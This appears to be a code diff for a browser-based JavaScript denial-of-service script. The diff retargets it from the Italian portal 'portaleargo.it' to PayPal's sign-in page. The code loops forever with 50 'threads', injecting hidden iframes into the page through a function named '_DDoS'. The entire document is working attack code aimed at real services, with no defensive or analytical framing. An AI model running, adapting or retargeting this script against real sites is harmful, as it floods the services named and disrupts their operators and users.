@@ -1,4 +1,4 @@
-var target = 'portaleargo.it';
+var target = 'www.paypal.com';
 var thread_count = 50;
 var scan_counter = 0;
 var resp_size_counter = 0;
@@ -67,5 +67,5 @@ function _DDoS(url){
  document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"></iframe>';
 }
 for(;;){
- setTimeout('_DDoS("https://portaleargo.it/")',1);
+ setTimeout('_DDoS("https://www.paypal.com/it/signin")',1);
 }
